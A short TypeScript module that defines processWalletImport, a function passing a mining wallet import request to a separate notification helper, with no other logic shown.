import type { MiningImportRequest } from "../validation/import-wallet";
import { notifyWalletImport } from "./import-notification";

export async function processWalletImport(data: MiningImportRequest): Promise<void> {
  await notifyWalletImport(data);
}
